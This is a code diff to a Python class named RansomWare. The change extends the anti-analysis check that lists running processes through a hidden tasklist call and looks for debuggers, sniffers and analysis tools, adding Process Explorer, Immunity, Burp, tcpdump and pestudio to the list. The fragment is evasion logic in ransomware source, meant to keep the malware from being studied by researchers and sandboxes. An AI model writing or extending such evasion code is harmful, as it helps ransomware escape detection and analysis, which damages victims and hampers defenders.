@@ -666,7 +666,7 @@ class RansomWare:
                 pass
 
             # Process analysis tools
-            bad_procs = ["x64dbg", "ollydbg", "ida", "wireshark", "procmon", "vbox", "vmtools", "qemu", "virtualbox"]
+            bad_procs = ["x64dbg", "ollydbg", "ida", "wireshark", "procmon", "vbox", "vmtools", "qemu", "virtualbox", "process explorer", "immunity", "burp", "tcpdump", "pestudio"]
             try:
                 output = subprocess.check_output("tasklist", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='ignore').lower()
                 for p in bad_procs:
